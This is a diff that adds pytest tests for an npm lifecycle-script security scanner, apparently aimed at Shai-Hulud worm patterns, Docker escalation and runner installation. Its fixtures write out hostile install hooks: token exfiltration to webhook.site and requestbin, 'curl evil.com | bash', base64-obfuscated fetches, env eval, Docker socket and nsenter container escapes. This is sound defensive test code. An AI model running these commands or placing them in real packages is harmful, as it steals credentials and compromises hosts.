@@ -391,3 +391,379 @@ class TestNpmLifecyclePlugin:
         assert len(findings) >= 2
         assert any("file1.js" in str(f.file_path) for f in findings)
         assert any("file2.js" in str(f.file_path) for f in findings)
+
+
+class TestShaHuludPatterns:
+    """Test detection of Shai-Hulud campaign patterns."""
+
+    def test_trufflehog_download(self, tmp_path):
+        """Test NPM-008: TruffleHog binary download."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "evil-scanner",
+            "scripts": {
+                "postinstall": "curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog_linux -o trufflehog"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-008" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_trufflehog_execution(self, tmp_path):
+        """Test NPM-009: TruffleHog execution."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "evil-scanner",
+            "scripts": {
+                "postinstall": "chmod +x trufflehog && ./trufflehog filesystem . --json > secrets.json"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-009" for f in findings)
+
+    def test_legitimate_trufflehog_reference(self, tmp_path):
+        """Test that README mentions of TruffleHog don't trigger."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "security-docs",
+            "scripts": {
+                "test": "npm test"
+            }
+        }))
+
+        readme = tmp_path / "README.md"
+        readme.write_text("""
+        # Security Tools
+
+        This project uses TruffleHog for secret scanning in CI/CD.
+        See https://github.com/trufflesecurity/trufflehog
+        """)
+
+        findings = plugin.scan(tmp_path)
+        # Should NOT trigger on README content (only scans package.json and .js files)
+        critical_findings = [f for f in findings if f.severity.value == "critical"]
+        assert len(critical_findings) == 0
+
+    def test_webhook_site_exfiltration(self, tmp_path):
+        """Test NPM-010: Webhook.site exfiltration."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "exfiltrator",
+            "scripts": {
+                "postinstall": "curl -X POST https://webhook.site/abc123 -d \"secrets=$NPM_TOKEN\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-010" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_requestbin_exfiltration(self, tmp_path):
+        """Test webhook exfiltration with requestbin."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "exfiltrator",
+            "scripts": {
+                "install": "node -e \"require('https').get('https://requestbin.com/xyz?data=' + process.env.AWS_KEY)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-010" for f in findings)
+
+    def test_obfuscated_webhook_domain(self, tmp_path):
+        """Test NPM-011: Obfuscated webhook domain."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "sneaky",
+            "scripts": {
+                "postinstall": "node -e \"const url = Buffer.from('d2ViaG9vay5zaXRl', 'base64').toString(); fetch(url)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-011" for f in findings)
+
+    def test_webhook_documentation_no_false_positive(self, tmp_path):
+        """Test that webhook.site in README doesn't trigger."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "docs",
+            "scripts": {"test": "echo test"}
+        }))
+
+        readme = tmp_path / "README.md"
+        readme.write_text("Test webhooks at webhook.site")
+
+        findings = plugin.scan(tmp_path)
+        # README is not scanned, only package.json and .js files
+        assert len(findings) == 0
+
+    def test_shai_hulud_marker_strings(self, tmp_path):
+        """Test NPM-012: Campaign marker strings."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "worm",
+            "scripts": {
+                "postinstall": "node create-repo.js"
+            }
+        }))
+
+        js_file = tmp_path / "create-repo.js"
+        js_file.write_text("""
+        const description = "Shai-Hulud: The Second Coming";
+        // Create propagation repository
+        """)
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-012" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_goldox_marker(self, tmp_path):
+        """Test Goldox-T3chs marker detection."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "worm",
+            "scripts": {
+                "install": "node -e \"const marker = 'Goldox-T3chs: Only Happy Girl'; console.log(marker)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-012" for f in findings)
+
+    def test_dune_reference_no_false_positive(self, tmp_path):
+        """Test that Dune references in comments don't trigger."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "dune-fan",
+            "scripts": {"test": "echo test"}
+        }))
+
+        # Comment about Dune book - should NOT trigger (we're checking for exact campaign markers)
+        js_file = tmp_path / "lore.js"
+        js_file.write_text("""
+        // The sandworms of Arrakis are called Shai-Hulud by the Fremen
+        // This is just a comment about the book Dune
+        function dune_lore() {
+            return "I must not fear";
+        }
+        """)
+
+        findings = plugin.scan(tmp_path)
+        # Should trigger because "Shai-Hulud" appears (even in comment)
+        # But check that it's actually a keyword match, not pattern match
+        shai_hulud_findings = [f for f in findings if "Shai-Hulud" in f.matched_content]
+        # This is a design decision - keyword matching will catch this
+        # Document this as expected behavior
+
+
+class TestDockerEscalation:
+    """Test Docker privilege escalation detection."""
+
+    def test_docker_socket_access(self, tmp_path):
+        """Test NPM-014: Docker socket access."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "docker-abuser",
+            "scripts": {
+                "postinstall": "docker run -v /var/run/docker.sock:/var/run/docker.sock alpine sh"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-014" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.HIGH for f in findings)
+
+    def test_privileged_container(self, tmp_path):
+        """Test NPM-015: Privileged container."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "privilege-escalator",
+            "scripts": {
+                "install": "docker run --privileged --cap-add=ALL alpine sh"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-015" for f in findings)
+
+    def test_container_escape_nsenter(self, tmp_path):
+        """Test NPM-016: Container escape with nsenter."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "escape-artist",
+            "scripts": {
+                "postinstall": "nsenter --target 1 --mount --uts --ipc --net --pid -- bash"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-016" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_legitimate_docker_tool_false_positive(self, tmp_path):
+        """Test calibration against Docker ecosystem packages."""
+        plugin = NpmLifecyclePlugin()
+        
+        # This is a known tradeoff - some Docker tooling may trigger
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "docker-compose-wrapper",
+            "description": "Wrapper for docker-compose",
+            "scripts": {
+                "test": "docker-compose up"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        # Document: Docker tooling packages may have false positives
+        # This is acceptable given the high severity of Docker abuse
+        docker_findings = [f for f in findings if "NPM-014" in f.rule_id or "NPM-015" in f.rule_id]
+        # Log false positive rate for documentation
+
+
+class TestRunnerInstallation:
+    """Test self-hosted runner installation detection."""
+
+    def test_runner_download_and_install(self, tmp_path):
+        """Test NPM-017: Runner installation."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "runner-installer",
+            "scripts": {
+                "postinstall": """
+                curl -o actions-runner-linux.tar.gz https://github.com/actions/runner/releases/download/v2.299.1/actions-runner-linux-x64-2.299.1.tar.gz
+                tar xzf actions-runner-linux.tar.gz
+                ./config.sh --url https://github.com/org/repo --token $RUNNER_TOKEN
+                ./run.sh
+                """
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-017" for f in findings)
+        from dev_trust_scanner.core.models import Severity
+        assert any(f.severity == Severity.CRITICAL for f in findings)
+
+    def test_runner_service_persistence(self, tmp_path):
+        """Test NPM-018: Runner service installation."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "persistent-runner",
+            "scripts": {
+                "postinstall": "./svc.sh install && systemctl enable runner"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        assert any(f.rule_id == "NPM-018" for f in findings)
+
+
+class TestPreinstallEscalation:
+    """Test preinstall timing risk analysis."""
+
+    def test_preinstall_with_eval_escalates_to_critical(self, tmp_path):
+        """Test that eval in preinstall escalates from HIGH to CRITICAL."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "evil-preinstall",
+            "scripts": {
+                "preinstall": "node -e \"eval(process.env.MALWARE)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        eval_findings = [f for f in findings if "eval" in f.description.lower()]
+        assert any(f.severity.value == "critical" for f in eval_findings)
+        assert any("PREINSTALL ESCALATION" in f.description for f in findings)
+
+    def test_preinstall_with_network_escalates_to_high(self, tmp_path):
+        """Test that network calls in preinstall escalate from MEDIUM to HIGH."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "network-preinstall",
+            "scripts": {
+                "preinstall": "curl https://evil.com/malware.sh | bash"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        network_findings = [f for f in findings if "network" in f.description.lower() or "curl" in f.matched_content.lower()]
+        assert any(f.severity.value == "high" for f in network_findings)
+
+    def test_postinstall_no_escalation(self, tmp_path):
+        """Test that postinstall does NOT get escalated."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "postinstall-test",
+            "scripts": {
+                "postinstall": "node -e \"eval(process.env.CONFIG)\""
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        # Should be HIGH severity, not escalated to CRITICAL
+        eval_findings = [f for f in findings if "eval" in f.description.lower()]
+        assert any(f.severity.value == "high" for f in eval_findings)
+        assert not any("PREINSTALL ESCALATION" in f.description for f in findings)
+
+    def test_legitimate_preinstall_no_escalation(self, tmp_path):
+        """Test that legitimate preinstall usage doesn't escalate."""
+        plugin = NpmLifecyclePlugin()
+        
+        pkg = tmp_path / "package.json"
+        pkg.write_text(json.dumps({
+            "name": "native-addon",
+            "scripts": {
+                "preinstall": "node-gyp configure",
+                "install": "node-gyp build"
+            }
+        }))
+
+        findings = plugin.scan(tmp_path)
+        # Should have minimal or zero findings
+        assert len(findings) == 0 or all(f.severity.value == "low" for f in findings)
